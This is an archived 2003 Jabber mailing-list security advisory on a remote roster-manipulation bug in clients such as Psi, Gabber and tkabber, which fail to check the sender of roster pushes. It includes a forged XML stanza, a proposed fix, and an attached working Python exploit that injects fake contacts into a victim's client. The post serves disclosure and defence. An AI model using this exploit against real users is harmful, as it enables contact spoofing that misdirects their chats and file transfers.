<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:jdev%40jabber.org?Subject=Re%3A%20%5BJDEV%5D%20%5BSECURITY%5D%20Remote%20roster%20manipulation%20bug%20in%20various%20Jabber%20clients&In-Reply-To=%3C20030702200511.GB650%40nic.bnet.pl%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="046298.html">
   <LINK REL="Next"  HREF="046247.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients</H1>
    <B>Jacek Konieczny</B> 
    <A HREF="mailto:jdev%40jabber.org?Subject=Re%3A%20%5BJDEV%5D%20%5BSECURITY%5D%20Remote%20roster%20manipulation%20bug%20in%20various%20Jabber%20clients&In-Reply-To=%3C20030702200511.GB650%40nic.bnet.pl%3E"
       TITLE="[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients">jajcus at bnet.pl
       </A><BR>
    <I>Wed Jul  2 15:05:11 CDT 2003</I>
    <P><UL>
        <LI>Previous message: <A HREF="046298.html">[work] Re: [JDEV] Re: Conference component for win32
</A></li>
        <LI>Next message: <A HREF="046247.html">[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#46246">[ date ]</a>
              <a href="thread.html#46246">[ thread ]</a>
              <a href="subject.html#46246">[ subject ]</a>
              <a href="author.html#46246">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>DESCRIPTION

From <A HREF="http://www.jabber.org/">http://www.jabber.org/</A> :

  Jabber is an open XML protocol for the real-time exchange of messages
  and presence between any two points on the Internet. The first
  application of Jabber technology is an asynchronous, extensible instant
  messaging platform, and an IM network that offers functionality similar
  to legacy IM systems such as AIM, ICQ, MSN, and Yahoo. However, Jabber
  offers several advantages over legacy IM systems.

RFC documents describing Jabber protocol (know as XMPP now) are being
prepared.

I have found a bug in most Jabber clients which allows to remotely
modify roster (list of contacts) displayed by the client. This can be
done by anyone who is able to establish his own Jabber server and allows
to forge contacts seen by the user. The actual roster stored on server
may not be modified directly using this bug.

I was thinking about informing authors first, but I would not be able to
test all Jabber clients and reach authors of all vulnerable clients. So
only some of them would be in privileged position.

DETAILS

1. Background

Roster is contact list stored on Jabber server. It is usually retrieved
by clients on login, managed by client, but always synchronized with
server. Roster contains following information:

- JID (jabber id) of contact - unique for each item
- contact name (nickname)
- list of groups (may be empty)
- presence subscriptions (information if contact can see user's presence
  and if user can see contact's presence)
- subscription state (if presence subscription/unsubscription is pending)

Multiple clients may be logged to the same Jabber account at once and
their rosters are synchronized. Roster may also be changed due to
presence subscription changes, which are managed by server. All roster
changes in clients are sent to server, and all changes in server are
sent to all connected clients. These &quot;roster pushes&quot; are sent as &quot;IQ&quot;
request with &quot;jabber:iq:roster&quot; namespace.

Such update request sent by server looks like this:
&lt;iq type='set'&gt;
	&lt;query xmlns='jabber:iq:roster'&gt;
		&lt;item jid='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at jabber.bnet.pl</A>' 
			name='Jajcus' 
			subscription='both'&gt;
				&lt;group&gt;Jabber Hackers&lt;/group&gt;
		&lt;/item&gt;
	&lt;/query&gt;
&lt;/iq&gt;

According to XMPP specs the &lt;iq/&gt; stanza could contain &quot;from&quot; and &quot;to&quot;
attributes which should contain full JID of the session then.

If the &quot;subscription&quot; attribute is set to &quot;remove&quot; then given item is 
to be removed.

2. Vulnerability

Many Jabber clients don't check &quot;from&quot; attribute of the roster push.
Such &lt;iq/&gt; stanza may be sent by anyone and will be routed to the client
session it was addressed to. Such stanza is processed by vulnerable
client as it was generated by server.

By sending following stanza (directed to victim's full JID):

&lt;iq type='set' to='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">victim at jabber.server</A>/resource'&gt;
	&lt;query xmlns='jabber:iq:roster'&gt;
		&lt;item jid='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at jabber.bnet.pl</A>' 
			name='Jajcus' 
			subscription='both'&gt;
				&lt;group&gt;Jabber Hackers&lt;/group&gt;
		&lt;/item&gt;
	&lt;/query&gt;
&lt;/iq&gt;

One would be able to add me to roster in victims client.

3. Impact

The attack cannot be done from Jabber client connection to jabberd 1.4.x
server because of similar bug (or feature) in this server - it doesn't
check &quot;to&quot; attribute and all such &lt;iq/&gt;s treats as directed to the
server. Attacker roster stored on server is modified instead of victims
ones.

For attack to succeed one must know not only user's bare JID, but also
name of a connected resource. Presence from the user is needed to get
such information, but usually it may be guessed - it would usually be
client name (&quot;Psi&quot;,&quot;tkabber&quot;, etc.) or location (&quot;Home&quot;,&quot;Work&quot;,etc.).

By using this vulnerability and modifying someone's roster one may make
him start chat or send file to a person user doesn't intend contact
with. This would require send one &lt;iq/&gt; to remove original entry, second
one to add new entry with the same name and usually &lt;presence/&gt; to show
the contact available. The new JID will usually be visible in chat
window or in roster item details, but users usually care about contact
name only.

This method changes roster copy in client only and doesn't change
original roster on server. But if victim changes the forged entry 
(eg. to fix a typo) it will be sent to his server. However subscription
information cannot be changed this way.

4. Vulnerable software

I have tested:

- Gabber 0.8.8
- tkabber 0.9.4beta
- Psi 0.8.7
- Psi 0.9

And I found all of them vulnerable.

5. Proposed fix

In clients before handling roster pushes check &quot;from&quot; attribute and drop
the request if &quot;from&quot; is set and is not session's full JID. 

6. Possible workaround

On server drop all &lt;iq/&gt; stanzas from &quot;outside&quot; containing
&quot;jabber:iq:roster&quot; namespace. However, this breaks normal XMPP stanza
routing rules.

7. Exploit

In attachment.

8. Thanks

Thanks to kalma, bluszcz and tristan for allowing me to hack their
clients and to mmazur for the help with the advisory :)

Greets,
	Jacek Konieczny
-------------- next part --------------
#!/usr/bin/python
#
# exploit for &quot;remote roster manipulation&quot; bug of various Jabber clients
# (c) 2003 Jacek Konieczny &lt;<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at bnet.pl</A>&gt;
#
# Requires: <A HREF="http://jabberpy.sourceforge.net/">http://jabberpy.sourceforge.net/</A>
#
# This exploit is an external component to jabber server which adds
# new item to victims roster (client local copy only)
#
# To link the exploit with your jabberd following fragment to your jabber.xml
# and restart jabberd.
# source.domain must be valid DNS hostname and point to your jabberd
#
# &lt;service id=&quot;bug&quot;&gt;
#     &lt;host&gt;source.domain&lt;/host&gt;
#     &lt;accept&gt;
#         &lt;ip&gt;127.0.0.1&lt;/ip&gt;
#         &lt;secret&gt;secret&lt;/secret&gt;
#         &lt;port&gt;6969&lt;/port&gt;
#     &lt;/accept&gt;
# &lt;/service&gt;
#
# Usage:
#	./exploit.py target-full-jid
#
# eg.:
#	./exploit.py <A HREF="http://mail.jabber.org/mailman/listinfo/jdev">someone at jabber.nowhere</A>/Home


import jabber
import xmlstream
import sys

def iq_handler(con,iq):
	print &quot;Got IQ:&quot;,str(iq.asNode())

me=&quot;source.domain&quot;

con = jabber.Component(host='127.0.0.1', debug=0, port=6969, log='log')
con.connect()
con.process(1)
con.auth('secret')
con.setIqHandler(iq_handler)

try:
	iq=jabber.Iq(to=sys.argv[1],type=&quot;set&quot;)
	iq.setFrom(me)
	query=iq.setQuery('jabber:iq:roster')
	group=xmlstream.Node(&quot;group&quot;)
	group.putData(&quot;Bugs&quot;)
	item=xmlstream.Node(&quot;item&quot;)
	item.putAttr(&quot;jid&quot;,&quot;<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">bug at bug.nowhere</A>&quot;)
	item.putAttr(&quot;name&quot;,&quot;BUG! BUG! BUG!&quot;)
	item.putAttr(&quot;subscription&quot;,&quot;none&quot;)
	item.insertNode(group)
	query.insertNode(item)
	con.send(iq)
	while(1):
		con.process(10)
except KeyboardInterrupt:
    con.disconnect()
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: &lt;<A HREF="https://www.jabber.org/jdev/attachments/20030702/448a2cf9/attachment-0001.pgp">https://www.jabber.org/jdev/attachments/20030702/448a2cf9/attachment-0001.pgp</A>&gt;
</PRE>

<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="046298.html">[work] Re: [JDEV] Re: Conference component for win32
</A></li>
	<LI>Next message: <A HREF="046247.html">[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#46246">[ date ]</a>
              <a href="thread.html#46246">[ thread ]</a>
              <a href="subject.html#46246">[ subject ]</a>
              <a href="author.html#46246">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://mail.jabber.org/mailman/listinfo/jdev">More information about the JDev
mailing list</a><br>
</body></html>
